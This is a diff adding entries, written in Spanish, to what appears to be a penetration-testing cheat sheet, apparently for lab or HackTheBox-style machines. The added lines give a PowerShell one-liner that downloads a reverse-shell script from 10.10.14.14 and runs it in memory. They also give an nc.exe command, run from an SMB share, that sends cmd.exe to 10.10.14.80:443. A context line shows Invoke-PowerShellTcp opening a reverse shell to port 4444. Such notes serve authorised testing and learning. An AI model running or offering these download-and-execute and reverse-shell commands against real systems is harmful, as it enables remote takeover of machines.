@@ -911,5 +911,22 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.80 -Port 4444
 
 ```
 
+Para descargar y en memoria:
+
+```
+powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')
+```
+
+### RCE via nc
+
+En kali seclist tiene nc.exe
+
+![image](https://github.com/gecr07/Acordeon/assets/63270579/da729171-7475-4f3c-9968-2aafbc38b221)
 
 
+```
+
+\\10.10.14.80\share\nc.exe -e cmd.exe 10.10.14.80 443
+
+```
+> https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
